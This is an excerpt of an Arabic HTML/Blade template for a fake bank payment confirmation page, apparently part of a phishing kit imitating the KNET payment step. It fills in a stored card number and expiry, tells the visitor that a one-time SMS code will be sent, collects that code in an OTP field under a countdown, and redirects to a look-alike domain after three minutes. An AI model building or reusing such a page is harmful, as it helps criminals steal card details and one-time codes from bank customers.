...
<script>
    setTimeout(function(){
        window.location.href = 'http://knet.gomra.online/';
    }, 180000);
</script>
            ...
            <div class="content-block">
                ...
                <div class="form-card">
                    ...
                    <div  class="row alert-msg" id="notificationbox" style="color:#31708f; font-family: Arial, Helvetica, serif; font-size: 10px;">
                        ...
                        <div  id="notification">
                            يرجى الانتباه سيتم ارسال رسالة نصية على رقم هاتفك الجوال المسجل لدى البنك الخاص بك هذه الرسالة المكونة من 6 خانات هي رمز تحقق لمرة  واحدة يرجى استخدام هذه الرسالة في الحقل المناسب ادناه
                        </div>
                    </div>
                    <div class="row">
                        <div style="text-align:right"><label class=" column-value text-label" id="DCNumber">{{$order->card_number}}</label></div>
                    ...
                    <div class="row" id="payConfirmExpyr">
                        <div style="float:right;text-align:right;"><label class="column-label" style="width: 100%;">:&#1587;&#1606;&#1577;
                                &#1575;&#1606;&#1578;&#1607;&#1575;&#1569; &#1575;&#1604;&#1589;&#1604;&#1575;&#1581;&#1610;&#1577;</label></div>
                        <div style="text-align:right;"><label class="column-value text-label" >{{$order->expire}}</label></div>
                    </div>
                    <!-- Added for Points Redemption -->
                    ...
                    <div class="row" id="OTPDCDIV" >
                        <div  style="float: right;text-align: right;padding-top: 3px;"><label class="column-label" style="width: 100%;"><span id="time">05:00</span>   :OTP  </label> </div>
                        <div  style="padding-left:7%">
                            <input class="allowalphanumericwithoutdecimal" type="tel"  style="text-align:right;width:60%;"  name="otp"  maxlength="" DIR="rtl"  />
                            <!-- Added for Points Redemption -->
